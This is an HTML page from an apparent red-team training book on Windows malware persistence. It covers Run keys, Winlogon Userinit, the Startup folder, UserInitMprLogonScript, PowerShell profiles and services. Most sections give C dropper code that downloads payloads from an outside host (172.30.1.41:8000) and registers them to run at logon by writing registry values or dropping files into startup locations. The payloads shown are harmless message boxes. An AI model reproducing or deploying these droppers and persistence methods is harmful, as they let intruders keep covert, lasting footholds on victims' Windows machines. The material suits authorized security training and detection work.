@@ -1,0 +1,1766 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Malware Persistence - Windows Offensive Techniques for Authorized Red Teams</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="src/mdbook-admonish.css">
+        <link rel="stylesheet" href="src/custom.css">
+        <link rel="stylesheet" href="./mdbook-admonish.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Windows Offensive Techniques for Authorized Red Teams</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="malware-persistence"><a class="header" href="#malware-persistence">Malware Persistence</a></h1>
+<p>Malware persistence allows you to continue an operation, even after a system is restarted or the target user logs off. Here, we will discuss some of the classic ways malware persists on Windows systems. However, classic methods are known, so we will also review some techniques for identifying new persistence methods.</p>
+<h2 id="utilizing-the-windows-user-logon-process-for-persistence"><a class="header" href="#utilizing-the-windows-user-logon-process-for-persistence">Utilizing the Windows User Logon Process for Persistence</a></h2>
+<p>Previously, when we reviewed the <strong>Windows Boot-Up Process</strong>, there was a discussion about <code>winlogon.exe</code> and <code>explorer.exe</code>. These two executables play a vital role in the <strong>Windows User Logon Process</strong>, as they are responsible for setting up the user environment and initializing the GUI. Once the user authenticates against the <strong>Local Security Authority Subsystem Service</strong> (LSASS) and their access token has been created, <code>winlogon.exe</code> launches <code>userinit.exe</code>, the first user-mode application. It is directly responsible for setting up the user environment, following these steps in order:</p>
+<ol>
+<li><strong>Launch Applications in the RunOnce Registry</strong></li>
+<li><strong>Apply Group Policy Settings and Run Synchronous Logon Scripts</strong></li>
+<li><strong>Load the User Profiles from <code>NTUSER.DAT</code>, including environment variables (<code>HKCU\Environment</code>)</strong></li>
+<li><strong>Execute Legacy Logon Scripts in <code>UserInitMprLogonScript</code></strong></li>
+<li><strong>Read <code>Shell</code> value from <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> (usually <code>explorer.exe</code>), then launch</strong></li>
+</ol>
+<p>If <code>explorer.exe</code> is launched as the shell, it takes over the task or running the remaining auto-start items asynchronously. This being:</p>
+<ul>
+<li><strong>The Standard <code>Run</code> Registry Keys</strong></li>
+<li><strong>The Startup Folder</strong></li>
+</ul>
+<p>The <strong>Windows User Logon Process</strong> is ripe with spaces to save malware for persistence. In this section, we will review a few methods that can be used.</p>
+<h3 id="registry-run-keys"><a class="header" href="#registry-run-keys">Registry Run Keys</a></h3>
+<p>We previously went over the <code>Run</code> and <code>RunOnce</code> registry keys. Any entry located in these registries will result in the automatic execution of the associated application once the user logs in. This is extremely convenient for malware persistence, as a new key, placed in the right entry, will ensure your payload remains on the system so there's no need to exploit the system again.</p>
+<p>Here is a basic example:</p>
+<pre><code class="language-C">// hack c
+#include &lt;windows.h&gt;
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
+    MessageBoxA(NULL, "You Have Been Hacked!", "&gt;:)", MB_OK);
+    return 0;
+}
+</code></pre>
+<p>This is our payload, and is responsible for conducting the malicious activity. Now this program does not inherently persist on the target. The functionality can be added directly to the program, but that increases the detection surface of the payload. Instead, we can create a new file to perform the persistence function.</p>
+<p>While there are a variety of techniques that can be used to solve this problem, at this stage in our learning, a <strong>dropper</strong> will suffice. Basically, a dropper is a program that downloads/installs one or more payloads, to a host, then typically sets up some form of persistence. In our example, it can be considered a <code>downloader</code>+<code>dropper</code>, since the dropper does not contain the payload and instead downloads it from a web server:</p>
+<pre><code class="language-C">// dropper.c
+#include &lt;windows.h&gt;
+
+int main(int argc, char* argv[]){
+    HKEY hKey = NULL;
+    const char* exe_path = "\\\%USERPROFILE\%\\hack.exe"
+
+    HRESULT downloadedFile = URL DownloadToFile(NULL, "http://172.30.1.41:8000/hack.exe", exe_path, 0, NULL);
+
+    long result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &amp;hKey);
+    if(result == ERROR_SUCCESS){
+        RegSetValueEx(hKey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe_path, strlen(exe_path));
+        RegCloseKey(hKey);
+    }
+    return 0;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>HKEY</code>: A handle to a specific key in the Windows Registry.</li>
+<li><code>URLDownloadToFile</code>: A core Windows API function used to download data from a specified URL and save it directly to a local file. Part of the <strong>URL Moniker</strong> (<code>urlmon.h</code>) library, which is integrated with the Windows Shell and Internet Explorer network stack.
+<pre><code class="language-C">HRESULT URLDownloadToFile(
+    [in] LPUNKNOWN pCaller,
+    [in] LPCTSTR szURL,
+    [in] LPCTSTR szFileName,
+    [in] DWORD dwReserved,
+    [in] LPBINDSTATUSCALLBACK lpfnCB
+);
+</code></pre>
+Here is a breakdown or the <code>URLDOwnloadToFile</code> function's parameters:
+<ul>
+<li><code>pCaller</code>: A pointer to the calling object's <code>IUNKNOWN</code> interface. This is typically used for COM object handling. Set to 'NULL' for simple, non-COM based downloads.</li>
+<li><code>szURL</code>: A pointer to a null-terminated string containing the URL from which to download the file.</li>
+<li><code>szFileName</code>: A pointer to a null-terminated string specifying the path and filename where the downloaded data will be saved.</li>
+<li><code>dwReserved</code>: Reserved for future use by Microsoft. Must be set to 0.</li>
+<li><code>lpfnCB</code>: A pointer to the client's <code>lBindStatusCallback</code> interface. This interface allows the caller to receive progress updates, cancel the download, or receive status notifications during the transfer. Usually set to <code>NULL</code> for a synchronous download without progress tracking.</li>
+<li><code>URLDownloadToFile</code> returns an <code>HRESULT</code> value. <code>S_OK</code> indicates success. Any other value indicates an error (i.e., network failure, file write permission issues).</li>
+</ul>
+</li>
+<li><code>RegOpenKeyEx</code>: A Windows API function used to obtain a handle (<code>HKEY</code>) to an existing key, which can then be used by other functions (i.e., <code>RegQueryValueEx</code>, <code>RegSetValueEx</code>, etc.) to read or modify the key's values and subkeys.
+<pre><code class="language-C">LONG RegOpenKeyEx(
+    [in] HKEY hKey,
+    [in, optional] LPCWSTR lpSubKey,
+    [in] DWORD ulOptions,
+    [in] REGSAM samDesired,
+    [out] PHKEY phkResult
+);
+</code></pre>
+Here is a breakdown of the <code>RegOpenKeyEx</code> functions' parameters:
+<ul>
+<li><code>hKey</code>: A handle to an already open key or one of the predefined root keys (i.e., <code>HKEY_LOCAL_MACHINE</code>)</li>
+<li><code>lpSubKey</code>: The name of the subkey to be opened relative to the key specified by hKey. Must be a null-terminated <strong>Unicode</strong> string (i.e., <code>L"Software\\Microsoft"</code>).</li>
+<li><code>ulOptions</code>: Reserved for future use. Must be set to 0.</li>
+<li><code>samDesired</code>: A mask that specifies the access rights needed for the key (i.e., read, write, delete). Dictates what operations you are allowed to perform on the key:
+<ul>
+<li><code>KEY_READ</code>: Required for querying key values and subkey data.</li>
+<li><code>KEY_SET_VALUE</code>: Required for writing new values or modifying existing ones.</li>
+<li><code>KEY_ALL_ACCESS</code>: Requests all possible access rights. Generally discouraged for security reasons. Request only the permissions needed.</li>
+<li><code>KEY_WOW64_32KEY</code> or <code>KEY_WOW64_64KEY</code>: Used in 32-bit applications running on 64-bit Windows systems (<code>WOW64</code>) to explicitly specify which registry view to access.</li>
+</ul>
+</li>
+<li><code>phkResult</code>: A pointer to an HKEY variable that receives the handle to the opened subkey upon success.</li>
+<li><code>RegOpenKeyEx</code> returns a LONG value. If the function succeeded, the return value is <code>ERROR_SUCCESS</code>(0). Upon failure, the return value is a non-zero error code (i.e. <code>ERROR_FILE_NOT_FOUND</code>).</li>
+</ul>
+</li>
+<li><code>RegSetValueEx</code>: A Windows API function used to set the data and type for a specified value within an open registry key.
+<pre><code class="language-C">LONG RegSetValueEx(
+    [in] HKEY hKey,
+    [in, optional] LPCWSTR lpValueName,
+);
+</code></pre>
+Here is a breakdown of the <code>RegSetValueEx</code> function's parameters:
+<ul>
+<li><code>hKey</code>: A handle to an open registry key. This handle must have been oped with the <code>KEY_SET_VALUE</code> access right.</li>
+<li><code>lpValueName</code>: The name of the value to be set or created. Must be a null-terminated <strong>Unicode</strong> string.</li>
+<li><code>Reserved</code>: Reserved for future use. Must be set to 0.</li>
+<li><code>dwType</code>: The type of data to be stored. This is crucial for how the data is interpreted by the system. Common types include <code>REG_SZ</code> (string) and <code>REG_DWORD</code> (32-bit number).</li>
+<li><code>lpData</code>: A pointer to the data buffer that contains the actual data to be stored. The format must match the <code>dwType</code>.</li>
+<li><code>cbData</code>: The size, in bytes of the data pointed to by <code>lpData</code>. Must include all bytes, including null-terminators.</li>
+<li><code>RegSetValueEx</code> returns a LONG value, <code>ERROR_SUCCESS</code>(0) on success. Non-zero value upon failure.</li>
+</ul>
+</li>
+<li><code>RegCloseKey</code>: A Windows API function used to receive the handle to a specified open registry key. A critical cleanup function as failing to close an <code>HKEY</code> handle can lead to resource leaks, and in some cases, can prevent the registry key from being modified or deleted by other processes.
+<pre><code class="language-C">LONG RegCloseKey(
+    [in] HKEY hKey
+);
+</code></pre>
+Here is a breakdown of the <code>RegCloseKey</code> function's parameters:
+<ul>
+<li><code>hKey</code>: A handle to the open registry key that you want to close. This handle is invalidated after the function returns successfully and should not be used again.</li>
+<li><code>RegCloseKey</code> returns a LONG value, <code>ERROR_SUCCESS</code> if successful. Non-zero value upon failure.</li>
+</ul>
+</li>
+</ul>
+<p>This dropper must be run with <strong>Administrator (elevated)</strong> privileges on Windows 10+ since, be default, Administrator/User accounts do not have a high enough integrity level (<code>High</code> Integrity Level or greater is required).</p>
+<h3 id="the-winlogon-process"><a class="header" href="#the-winlogon-process">The Winlogon Process</a></h3>
+<p><code>Winlogon.exe</code> manages user logon and logoff operations, managing system starting and shutdown procedures, as well as implementing screen locking functionality. It uses the following Registry Keys for different purposes:</p>
+<ul>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code>: Tells Windows which program to start after a user has logged on. The specified executable becomes the user's shell, meaning every logon session will launch that program instead of <code>explorer.exe</code>, unless the custom program explicitly starts Explorer itself.</li>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlong\Userinit</code>: Specifies the program(s) that run immediately after credential validation, before the shell is started. Pointing the entry value to a different executable (or a comma-separated list such as <code>myinit.exe</code>, <code>userinit.exe</code>) lets you execute custom code at logon-used for legitimate startup tasks, or in malicious contexts, persistence.</li>
+</ul>
+<p>These Registry keys are only readable by a user with a <code>Medium</code> Integrity Level or higher. A minimum of a <code>High</code> IL is required to modify them on Windows 10+.</p>
+<p>Here is an example of how it works:</p>
+<pre><code class="language-C">// hack.c
+#include &lt;windows.h&gt;
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
+    MessageBoxA(NULL, "You have been hacked!", "&gt;:)", MB_OK);
+    return 0;
+}
+</code></pre>
+<p>The modifications made by our dropper to the <code>Userinit</code> registry key will lead to both activation of <code>explorer.exe</code> and <code>hack.exe</code> upon user logon:</p>
+<pre><code class="language-C">// dropper_userinit.c
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char* argv[]){
+    HKEY hKey = NULL;
+    const char* sh = "C:\\Windows\\System32\\hack.exe";
+    const char* exe = "C:\\Windows\\System32\\userinit.exe,C:\\Windows\\System32\\hack.exe";
+    HRESULT downloadedFile = URLDownloadToFile(NULL, "http://172.30.1.41:8000/hack.exe", sh, 0, NULL);
+    printf("Running\n");
+    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &amp;hKey);
+    if (result == ERROR_SUCCESS){
+        RegSetValueEx(
+            hKey,
+            (LPCSTR)"Userinit",
+            0, REG_SZ,
+            (unsigned char*)exe,
+            strlen(exe)
+        );
+        RegCloseKey(hKey);
+        printf("Key Written Successfully!\n");
+    } else {
+        printf("Something went wrong %d\n", GetLastError());
+    }
+    return 0;
+}
+</code></pre>
+<p>By default on Windows 10+ systems, modifications to the Winlogon helper can only be performed by authorized administrators.</p>
+<h3 id="the-startup-folder"><a class="header" href="#the-startup-folder">The Startup Folder</a></h3>
+<p>The Startup Folder is a special directory that Windows checks each time a user logs on. Any shortcuts scripts or executable files placed in this folder are automatically launched at logon, allowing programs to start automatically, after <code>explorer.exe</code> is launched. Startup applications can apply to a single user or the system as a whole. These folders are typically located at:</p>
+<ul>
+<li><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
+<li><code>%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
+</ul>
+<p>Where:</p>
+<ul>
+<li><code>%APPDATA%</code> expands to <code>C:\Users\&lt;username&gt;\AppData\Roaming</code></li>
+<li><code>%ProgramData</code> expands to <code>C:\ProgramData</code></li>
+</ul>
+<p>When a user logs on, Windows reads the <code>All Users</code> Startup folder first, then the <code>Current User</code> Startup folder. Each item (usually a shortcut <code>.lnk</code>) is executed in the order it appears.</p>
+<p>Here is an example of a basic program:</p>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+
+int main() {
+    HRESULT downloadedFile = URLDownloadToFile(
+        NULL,
+        "http://172.30.1.41:8000/hack_cmd.exe",
+        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hack_cmd.exe",
+        0,
+        NULL
+    );
+}
+</code></pre>
+<p>By installing the file directly in the Startup folder, it should launch right after a user logs on, establishing persistence.</p>
+<h3 id="userinitmprlogonscript"><a class="header" href="#userinitmprlogonscript"><code>UserInitMprLogonScript</code></a></h3>
+<p><code>UserInitMprLogonScript</code> can be used to store persistent scripts. However it is rare for programs to actually save data here. Usually, the <code>Run</code>/<code>RunOnce</code> registry keys provide better OpSec because they blend in more with normal system activity and are less likely to be flagged by baseline monitoring. This is, however, entirely depended on the defender's diligence in monitoring their networks and systems.</p>
+<p><code>UserInitMprLogonScript</code> scripts can be saved at:</p>
+<ul>
+<li><code>HKCU\Environment\UserInitMprLogonScript</code></li>
+<li><code>HKLM\Environment\UserInitMprLogonScript</code></li>
+<li><code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\UserInitMprLogonScript</code></li>
+</ul>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+
+int main(){
+    HKEY hKey = NULL;
+    const char* payload_path = "C:\\Windows\\System32\\hack.exe";
+    HRESULT downloadedFile = URLDownloadToFile(
+        NULL,
+        "http://172.30.1.41:8000/hack.exe",
+        (LPCSTR)payload_path,
+        0,
+        NULL
+    );
+    LONG result = RegOpenKeyEx(
+        HKEY_CURRENT_USER,
+        (LPCSTR)"Environment",
+        0,
+        KEY_WRITE,
+        &amp;hKey
+    );
+    if(result == ERROR_SUCCESS){
+        RegSetValueEx(
+            hKey,
+            (LPCSTR)"UserInitMprLogonScript",
+            0,
+            REG_SZ,
+            (const unsigned char*)payload_path,
+            strlen(payload_path)
+        );
+        RegCloseKey(hKey);
+    }
+    return 0;
+}
+</code></pre>
+<h2 id="powershell-profiles"><a class="header" href="#powershell-profiles">PowerShell Profiles</a></h2>
+<p>PowerShell Profiles are acripts that run automatically every time a new PowerShell session starts. They are used to customize the PowerShell environment, allowing you to load specific settings, define aliases, functions and variables, or import modules that you want to be made available in each session automatically.</p>
+<p>PowerShell provides an automatic variable named <code>$PROFILE</code>, which stores the path to the current user's/host's profile file, making it easy to locate, create, and modify the profile script(s). The PowerShell execution policy must allow scripts (<code>.ps1</code>) to run for the profile to load automatically. The default <code>Restricted</code> policy on Windows 10+ prevents all scripts, including profiles, from running. This can be checked using the <code>Get-ExecutionPolicy</code> cmdlet or viewing the following Registry keys, in order:</p>
+<ol>
+<li><strong>Machine Policy</strong> (Group Policy): <code>HKLM\Software\Policies\Microsoft\Widows\PowerShell</code></li>
+<li><strong>User Policy</strong> (Group Policy): <code>HKCU\Software\Policies\Microsoft\Windows\PowerShell</code></li>
+<li><strong>LocalMachine</strong> (Local Setting): <code>HKLM\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell</code></li>
+<li><strong>Current User</strong> (User Setting): <code>HKCU\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell</code></li>
+<li><strong>Process</strong> (Current Session): Temporary; Does not have a Registry Key Entry. Use (<code>Get-ExecutionPolicy -scope Process</code>)</li>
+</ol>
+<p>In PowerShell, <code>Get-ExecutionPolicy -list</code> will quickly get the values of each of these Execution Policy Scopes, where:</p>
+<ul>
+<li><code>Restricted</code>: Locks down PowerShell so that it operates strictly as an interactive shell, preventing you from running scripts.</li>
+<li><code>Unrestricted</code>: Allows all PowerShell scripts to run without any content restrictions, although unsigned scripts from a remote origin will display a warning prompt asking for permission to run.</li>
+<li><code>Remote Signed</code>: Allows locally created scripts to run without a signature, but remotely sourced scripts must be signed by a trusted publisher to run.</li>
+<li><code>AllSigned</code>: Requires all PowerShell scripts and configuration files, regardless of where they are sourced, to have a valid digital signature from a trusted publisher in order to run.</li>
+<li><code>Undefined</code>: A value has not been set for that particular scope, allowing policies from scopes with higher precedence to take effect. If all scopes are undefined, Windows clients default to restricted and Windows Servers default to <code>RemoteSigned</code>.</li>
+</ul>
+<p>The order of scope precedence (from highest to lowest) is:</p>
+<ol>
+<li><code>MachinePolicy</code></li>
+<li><code>UserPolicy</code></li>
+<li><code>Process</code></li>
+<li><code>CurrentUser</code></li>
+<li><code>LocalMachine</code></li>
+</ol>
+<p>PowerShell supports several profile files, depending on the user and the specific host program being run (i.e., the standard console, the Integrated Scripting Environment (ISE) or Visual Studio Code). They are executed in a order, from general to particular, allowing for a layered configuration:</p>
+<ul>
+<li><strong>All Users, All Hosts</strong>: Applies to all users and all PowerShell host programs on the computer. Found at <code>$PSHOME\Profile.ps1</code>.</li>
+<li><strong>All Users, Current Host</strong>: Applies to all users, but is specific to the current host programs. Found at <code>$PSHOME\Microsoft.PowerShell_profile.ps1</code>.</li>
+<li><strong>Current User, All Hosts</strong>: Applies only to the current user but works across all host programs. Found at <code>$HOME\Documents\WindowsPowerShell\Profile.ps1</code></li>
+<li><strong>Current User, Current Host</strong>: Applies only to the current user and is specific to the current host program (most commonly used). Found at <code>$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</code></li>
+</ul>
+<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
+<div class="admonition-title">
+<div id="admonition-note-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note"></a>
+</div>
+<div>
+<p><strong>Note</strong>
+<code>$HOME</code>: The current user's home directory (i.e., <code>C:\Users\&lt;username&gt;</code>)
+<code>PSHOME</code>: The PowerShell installation directory (i.e., <code>C:\Windows\System32\WindowsPowerShell\v1.0</code>)</p>
+</div>
+</div>
+<p>It is important not to put any code into the profile that will block, because the user will not be presented with an input prompt until the profile script has finished executing. A workaround is to execute the payload via the <code>Start-Job</code> cmdlet.</p>
+<pre><code class="language-PowerShell"># Profile.ps1
+[void](Start-Job -ScriptBlock {
+    Add-Type -AssemblyName System.Windows.Forms
+    [System.Windows.Forms.MessageBox]::Show('You have been hacked!', `&gt;:)`)
+})
+</code></pre>
+<p>Where:</p>
+<ul>
+<li>
+<p><code>Add-Type -AssemblyName System.Windows.Forms</code>: Loads the necessary .Net Framework assembly that contains the classes required to interact with Windows GUI elements, like message boxes.</p>
+<ul>
+<li><code>Add-Type</code>: cmdlet which loads a .NET class or assembly into the current PowerShell session.</li>
+<li><code>AssemblyName</code>: Specifies that a pre-compiled assembly (a DLL) that is part of the .NET Framework will be loaded.</li>
+<li><code>System.Windows.Forms</code>: The name of the specific assembly (DLL) being loaded.
+<ul>
+<li>This DLL in particular contains classes for creating desktop applications, including controls like buttons, forms, and the static MessageBox class.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>[System.Windows.Forms.MessageBox]::Show('You have been hacked', '&gt;:)')</code>: A static method call that invokes the Windows API to display a small pup-up window on the user's desktop.</p>
+<ul>
+<li><code>[System.Windows.Forms.MessageBox]</code>: Specifies the exact class within the loaded assembly that needs to be used.</li>
+<li><code>::</code>: The static member operator in PowerShell. It is used to call a static method (a method belonging to the class itself, not an instance of the class) or access a static property.</li>
+<li><code>Show(...)</code>: The static method of the MessageBox class that is responsible for opening and displaying the dialog box on the screen.</li>
+</ul>
+</li>
+<li>
+<p><code>Start-Job -ScriptBlock{...}</code>: PowerShell cmdlet, which starts a new detached PowerShell process (a background job) to execute the code contained within the script block({...}). This allows the main shell session to immediately return a prompt and continue running commands without waiting for the job to finish.</p>
+</li>
+<li>
+<p><code>[void](...)</code>: A type-casting operation that ensures that any object returned will be discarded, preventing it from being printed to the console.</p>
+</li>
+</ul>
+<p>A simple dropper can be used to download the script to the right location on the system:</p>
+<pre><code class="language-C">// dropper_profile.c
+
+int main(){
+    HRESULT downloadedFile = URLDownloadToFile(NULL, "http://172.30.1.41:8000/profile_persistence.ps1", "C:\\Users\\vagrant\\Documents\\WindowsPowerShell\\Profile.ps1", 0, NULL);
+}
+</code></pre>
+<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
+<div class="admonition-title">
+<div id="admonition-note-1-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-1"></a>
+</div>
+<div>
+<p><strong>Note</strong>
+This persistence method requires PowerShell to run before the payload is run. Unless PowerShell is automatically run, you will have to wait for a user to start it before the payload runs. Also, unless the payload is migrated to another process, it will end once PowerShell is closed.</p>
+</div>
+</div>
+<h2 id="windows-services"><a class="header" href="#windows-services">Windows Services</a></h2>
+<p>A <strong>Windows Service</strong> is a specialized program that operates in the background of the Windows operating system, similar to a UNIX daemon. Services run independently of a user session and can be configured to start automatically when the system boots, even before a user logs in. They are essential for managing critical system functions such as network connectivity, hardware, system security, and for automating routine tasks like updates and backups.</p>
+<p>By default the ability to create or modify a Windows service typically requires Administrator privileges or the Local System, meaning you need a High or System Integrity Level. To create a new service or modify an existing one's configuration, the calling process must have the necessary access rights to the <strong>Service Control Manager</strong> (SCM) and the specific service object. A user account must have the <code>SC_MANAGER_CREATE_SERVICE</code> access rights on the SCM to install a new service. By default, only Built-in Administrators have this right. Once installed, the service itself often runs under highly privileged accounts like <code>Local System</code>, <code>Local Service</code>, or <code>Network Service</code>, with each having different levels of permission. The <code>Local System</code> account is the most powerful and has extensive privileges on the local machine.</p>
+<p>WIndows services rely on the Windows Registry as their central configuration and database repository. The SCM reads and writes to specific registry keys to determine how and when a service should run. This configuration is primarily stored under <code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;Service Name&gt;</code>. For every installed service, there is a subkey named after the service's short name that contains all of its critical metadata.</p>
+<p>The most critical use of the registry is to store the necessary configuration details that the SCM needs to load, start, and manage the service. Key values found in a service's registry subkey include:</p>
+<ul>
+<li><code>ImagePath</code> (REG_EXPAND_SZ): The full path to the service executable file (<code>.exe</code> or <code>.sys</code>). This is the file the SCM executes to start the service.</li>
+<li><code>DisplayName</code> (REG_SZ): The user-friendly name that appears in the Services snap-in (<code>services.msc</code>).</li>
+<li><code>Start</code> (REG_DWORD): Specifies the startup type for the service including:
+<ul>
+<li>Automatic (2)</li>
+<li>Manual/On-Demand (3)</li>
+<li>Disabled (4)</li>
+</ul>
+</li>
+<li><code>ObjectName</code> (REG_SZ): The account under which the service runs (i.e., <code>LocalSystem</code>, <code>NetworkService</code>, or a user account)</li>
+<li><code>DependOnService</code> (REG_MULTI_SZ): A list of other services that must be running before this service can start.</li>
+</ul>
+<p>Individual services also use the registry to store their own internal, non-SCM related configuration and state data, including Custom Settings, Driver Configurations, and the paths for any required Service DLLs. In summary, the registry is the sole location used by the SCM to verify a service's existence, behavior, or core settings, enabling the SCM to reliably manage it from boot-up through its entire lifecycle.</p>
